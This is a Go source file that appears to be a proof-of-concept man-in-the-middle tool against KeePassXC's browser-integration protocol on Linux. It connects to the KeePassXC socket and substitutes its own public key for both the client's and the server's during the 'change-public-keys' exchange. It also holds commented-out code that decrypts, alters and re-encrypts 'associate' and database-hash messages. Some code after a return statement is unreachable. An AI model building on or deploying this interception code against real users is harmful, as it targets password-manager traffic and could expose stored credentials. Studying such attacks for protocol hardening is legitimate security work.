package keepassxc_browser

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path"
	"runtime"

	"github.com/jamesruan/sodium"
)

type MitmReq struct {
	ActionName string `json:"action"`
	Nonce      string `json:"nonce"`
	ClientId   string `json:"clientID"`
	RequestId  string `json:"requestID"`
	Message    string `json:"message"`
	PublicKey  string `json:"publicKey"`
	Success    string `json:"success"`
	Error      string `json:"error"`
	ErrorCode  string `json:"errorCode"`
	Version    string `json:"version"`
	data       interface{}
	nonce      sodium.BoxNonce
}

func (m *MitmReq) Parse(breq []byte) (err error) {
	if err = json.Unmarshal(breq, m); err != nil {
		return err
	}

	if m.Nonce != "" {
		m.nonce.Bytes, err = base64.StdEncoding.DecodeString(m.Nonce)
		if err != nil {
			return err
		}
	}

	return nil
}

type KpXcMitm struct {
	conn         ConnectionI
	keyPair      sodium.BoxKP
	clientPubKey sodium.BoxPublicKey
	serverPubKey sodium.BoxPublicKey
}

func (k *KpXcMitm) pocHandleEncReq(req *MitmReq) (hres []byte, err error) {
	//res := &MitmReq{}

	//switch req.ActionName {
	//case "get-databasehash":
	//req.data = &MsgGetDatabasehash{}
	//res.data = &MsgGetDatabasehash{}
	//break
	//case "associate", "test-associate":
	//req.data = &MsgAssociate{}
	//res.data = &MsgAssociate{}
	//break
	//}

	//if req.Message != "" && req.Nonce != "" {
	//slog.LOG_DEBUGF("req: ")
	//if err = Decrypt(req.nonce, k.clientPubKey, k.keyPair.SecretKey, req.Message, req.data); err != nil {
	//return hres, err
	//}
	////slog.LOG_DEBUGF("decrypted req: %v\n", req.data)
	//if req.ActionName == "associate" {
	//req.data.(*MsgAssociate).Key = base64.StdEncoding.EncodeToString(k.keyPair.PublicKey.Bytes)
	//}
	//if req.Message, err = Encrypt(req.nonce, k.serverPubKey, k.keyPair.SecretKey, req.data); err != nil {
	//return hres, err
	//}
	//}

	//jreq, err := json.Marshal(req)
	//if err != nil {
	//return hres, err
	//}
	//if err = k.conn.Send(jreq); err != nil {
	//return hres, err
	//}

	//jres, err := k.conn.Recv(BufSize, 0)
	//if err != nil {
	//return hres, err
	//}
	////slog.LOG_DEBUGF("jres: %v\n", jres)
	////slog.LOG_DEBUGF("jres: %s\n", jres)
	//if err = res.Parse(jres); err != nil {
	//return hres, err
	//}

	//if res.Message != "" && res.Nonce != "" {
	//slog.LOG_DEBUGF("res: ")
	//if err = Decrypt(res.nonce, k.serverPubKey, k.keyPair.SecretKey, res.Message, res.data); err != nil {
	//return hres, err
	//}
	////slog.LOG_DEBUGF("decrypted res: %v\n", res.data)
	//if res.Message, err = Encrypt(res.nonce, k.clientPubKey, k.keyPair.SecretKey, res.data); err != nil {
	//return hres, err
	//}
	//}

	//return json.Marshal(res)
	return nil, fmt.Errorf("not implemented")
}

func (k *KpXcMitm) handleChangePubKeys(req *MitmReq) (hreq []byte, err error) {
	if k.clientPubKey.Bytes, err = base64.StdEncoding.DecodeString(req.PublicKey); err != nil {
		return hreq, err
	}

	req.PublicKey = base64.StdEncoding.EncodeToString(k.keyPair.PublicKey.Bytes)

	jreq, err := json.Marshal(req)
	if err != nil {
		return hreq, err
	}
	if err = k.conn.Send(jreq); err != nil {
		return hreq, err
	}

	jres, err := k.conn.Recv(BufSize, 0)
	if err != nil {
		return hreq, err
	}
	res := &MitmReq{}
	if err = res.Parse(jres); err != nil {
		return hreq, err
	}

	if k.serverPubKey.Bytes, err = base64.StdEncoding.DecodeString(res.PublicKey); err != nil {
		return hreq, err
	}

	res.PublicKey = base64.StdEncoding.EncodeToString(k.keyPair.PublicKey.Bytes)

	return json.Marshal(res)
}

func (k *KpXcMitm) HandleReq(breq []byte) (res []byte, err error) {
	//slog.LOG_DEBUGF("breq: %v\n", breq)
	//slog.LOG_DEBUGF("breq: %s\n", breq)

	req := &MitmReq{}
	if err = req.Parse(breq); err != nil {
		return res, err
	}

	if req.ActionName == "change-public-keys" {
		return k.handleChangePubKeys(req)
	}

	return k.pocHandleEncReq(req)

	if err = k.conn.Send(breq); err != nil {
		//slog.LOG_DEBUGF("err: %v\n", err)
		return res, err
	}

	if res, err = k.conn.Recv(BufSize, 0); err != nil {
		return res, err
	}
	//slog.LOG_DEBUGF("res: %v\n", res)
	//slog.LOG_DEBUGF("res: %s\n", res)

	return res, err
}

func NewKpXcMitm() (ret *KpXcMitm, err error) {
	serv := new(KpXcMitm)
	var serverAddress string

	tmpDir := os.Getenv("TMPDIR")
	if tmpDir != "" {
		tmpDir = path.Join(tmpDir, SocketName)
	}

	xdgRuntimeDir := os.Getenv(("XDG_RUNTIME_DIR"))
	if xdgRuntimeDir != "" {
		xdgRuntimeDir = path.Join(xdgRuntimeDir, SocketName)
	}

	oss := runtime.GOOS
	switch oss {
	case "linux":
		serv.conn = &PosixConnection{}
		if _, err = os.Stat(tmpDir); err == nil {
			serverAddress = tmpDir
			break
		}
		if _, err := os.Stat(xdgRuntimeDir); err == nil {
			serverAddress = xdgRuntimeDir
			break
		}
		return serv, fmt.Errorf("Unable to locate keepassxc socket")
	default:
		return serv, fmt.Errorf("Operating System: '%s' not supported", oss)
	}

	//slog.LOG_DEBUGF("serverAddress: %s\n", serverAddress)
	if err = serv.conn.Connect(serverAddress); err != nil {
		return serv, err
	}
	serv.keyPair = sodium.MakeBoxKP()
	ret = serv

	return ret, err
}
